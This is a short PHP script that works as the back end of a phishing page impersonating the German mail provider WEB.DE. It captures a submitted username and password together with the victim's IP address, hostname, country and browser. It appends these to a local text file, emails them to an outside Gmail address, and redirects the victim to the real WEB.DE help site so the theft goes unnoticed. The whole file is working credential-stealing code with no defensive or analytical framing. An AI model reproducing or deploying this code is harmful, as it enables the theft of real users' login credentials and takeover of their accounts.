<?php

$name = "username";
$password = "password";
$subj = "WEB";


$user = $_POST[$name];
$pass = $_POST[$password];
$ip = getenv('REMOTE_ADDR');
$hostname = gethostbyaddr($ip);
$country = getenv('GEOIP_COUNTRY_NAME');
$browser= getenv('HTTP_USER_AGENT');


$msg = "
USER: $user
PASS: $pass

IP: $ip - $hostname - $country
Browser: $browser\n";

$fh = fopen("web2web2.txt",'a');
fputs($fh,  $msg);
fclose($fh);

$receiverEmail = 'sicherezahlung@gmail.com';
mail("sicherezahlung@gmail.com", $subj, $msg);
header("Location: https://hilfe.web.de/index.html");
?>